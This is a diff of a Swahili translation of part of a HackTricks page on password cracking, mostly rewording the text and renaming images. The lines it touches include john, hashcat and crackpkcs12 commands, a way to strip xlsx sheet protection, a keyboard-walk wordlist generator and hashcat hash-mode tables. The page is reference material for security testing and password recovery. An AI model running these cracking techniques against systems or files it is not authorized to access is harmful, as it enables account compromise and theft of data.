-Mafunzo mengine ya Luks BF: [http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1](http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1)
+Mwongozo mwingine wa Luks BF: [http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1](http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1)
 
 ### Mysql
 ```bash
@@ -732,7 +670,7 @@ john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
 ```
 ### Cisco
 
-<figure><img src="../.gitbook/assets/image (660).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (663).png" alt=""><figcaption></figcaption></figure>
 
 ### DPAPI Master Key
 
@@ -743,7 +681,7 @@ Tumia [https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py]
 Ikiwa una faili ya xlsx na safu iliyolindwa kwa nenosiri unaweza kuiondoa ulinzi:
 
 * **Iipakie kwenye google drive** na nenosiri litafutwa moja kwa moja
-* Kui **ondoa** **kwa mikono**:
+* Kui **ondoa** kwa **mikono**:
 ```bash
 unzip file.xlsx
 grep -R "sheetProtection" ./*
@@ -759,10 +697,10 @@ zip -r file.xls .
 # From https://github.com/crackpkcs12/crackpkcs12
 crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
 ```
-<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-Tumia [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kujenga na **kutumia** mchakato wa kiotomatiki ulioendeshwa na zana za **jamii** za **juu kabisa** duniani.\
+Tumia [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kujenga na **kutumia** mchakato wa kiotomatiki ulioendeshwa na zana za **jamii** za juu zaidi duniani.\
 Pata Ufikiaji Leo:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
@@ -783,9 +721,9 @@ hash-identifier
 * [**Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/wordlists)
 * [**Seclists - Passwords**](https://github.com/danielmiessler/SecLists/tree/master/Passwords)
 
-### **Vyombo vya Kuzalisha Orodha za Maneno**
+### **Vyombo vya Uzalishaji wa Orodha za Maneno**
 
-* [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** Jenereta ya kipekee ya kutembea kwa kibodi yenye herufi za msingi zinazoweza kubadilishwa, ramani ya kibodi na njia.
+* [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** Jenereta ya kipekee ya kutembea kwa kibodi yenye herufi za msingi zinazoweza kubadilishwa, ramani ya funguo na njia.
 ```bash
 kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
 ```
@@ -864,25 +802,21 @@ hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
 ```bash
 hashcat --example-hashes | grep -B1 -A2 "NTLM"
 ```
-# Kuvunja Hashes za Linux - faili ya /etc/shadow
-
-Kwa kawaida, faili ya `/etc/shadow` ina hashes za nywila za watumiaji kwenye mfumo wa Linux. Kuvunja hashes hizi kunaweza kufanywa kwa kutumia mbinu ya nguvu ya kufikiria (brute force) au mbinu zingine za kuvunja nywila. Mara nyingi, kuvunja nywila za Linux kunahusisha kutumia dictionaries au wordlists kwa kufikiria nywila zilizowezekana.
+### Kuvunja Hashes za Linux - faili ya /etc/shadow
 ```
 500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
 3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
 7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
 1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
 ```
-# Kuvunja Windows Hashes
+### Kuvunja Hashes za Windows
 
-Kuvunja Windows Hashes kunaweza kufanywa kwa kutumia mbinu ya nguvu ya kufikiria. Hii inahusisha jaribio la kila aina ya nenosiri linalowezekana hadi hash inayolinganishwa inapatikana. Kuna zana nyingi zinazopatikana kama Hashcat au John the Ripper ambazo zinaweza kutumika kwa madhumuni haya. Mara tu hash inapovunjwa, inaweza kutafsiriwa kuwa nenosiri la asili kwa kutumia meza ya upatanishi ya nenosiri.
+Kuvunja nywila za Windows kunaweza kufanywa kwa kutumia mbinu ya nguvu ya kufikiria (brute force) kwa kutumia programu kama vile Ophcrack au Hashcat. Mbinu hii inahusisha jaribio la kila iwezekanavyo la nywila hadi nywila sahihi itakapopatikana. Hatua hii inahitaji muda na uwezo wa kompyuta unaofaa kwa sababu ya idadi kubwa ya majaribio yanayohitajika.
 ```
 3000 | LM                                               | Operating-Systems
 1000 | NTLM                                             | Operating-Systems
 ```
-### Kuvunja Hashes za Maombi Maarufu
-
-Kuvunja nywila za maombi maarufu kunaweza kufanywa kwa kutumia mbinu ya nguvu ya kufanya kazi (brute force) au kutumia orodha ya maneno (wordlist) ili kulinganisha na hash iliyopatikana. Mbinu hizi zinaweza kutumika kuvunja nywila za maombi kama vile WordPress au Joomla. Kwa kutumia programu za kuvunja nywila kama Hashcat au John the Ripper, unaweza kujaribu mamilioni ya kombinisheni za nywila kwa haraka sana. Kumbuka kuwa kuvunja nywila bila idhini ni kinyume cha sheria na inapaswa kufanywa kwa kuzingatia maadili ya kisheria.
+Kuvunja Hashes za Maombi Maarufu
 ```
 900 | MD4                                              | Raw Hash
 0 | MD5                                              | Raw Hash
@@ -894,22 +828,22 @@ Kuvunja nywila za maombi maarufu kunaweza kufanywa kwa kutumia mbinu ya nguvu ya
 ```
 <details>
 
-<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>
+<summary><strong>Jifunze AWS hacking kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>
 
 Njia nyingine za kusaidia HackTricks:
 
-* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
-* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
+* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
+* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
 * Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
+* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
 
 </details>
 
-<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-Tumia [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kujenga na **kudhibiti mchakato** kwa urahisi kutumia zana za **jamii za hali ya juu zaidi** duniani.\
+Tumia [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kujenga na **kutomatisha mchakato** zinazotumia zana za jamii **za juu zaidi** duniani.\
 Pata Ufikiaji Leo:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
